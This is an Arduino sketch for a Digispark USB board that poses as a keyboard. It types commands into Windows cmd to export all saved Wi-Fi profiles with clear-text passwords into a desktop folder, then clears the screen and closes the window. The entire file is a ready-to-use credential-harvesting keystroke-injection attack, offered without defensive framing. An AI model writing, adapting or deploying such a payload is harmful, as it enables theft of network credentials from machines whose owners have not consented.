#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);

  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(2000);

  DigiKeyboard.println("mkdir \"C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords\"");
  DigiKeyboard.delay(1500);

  DigiKeyboard.println("netsh wlan export profile folder=\"C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords\" key=clear");
  DigiKeyboard.delay(4000);

  DigiKeyboard.println("cls");
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("exit");

  digitalWrite(1, HIGH);
  DigiKeyboard.delay(50);
  digitalWrite(1, LOW);
}

void loop() {}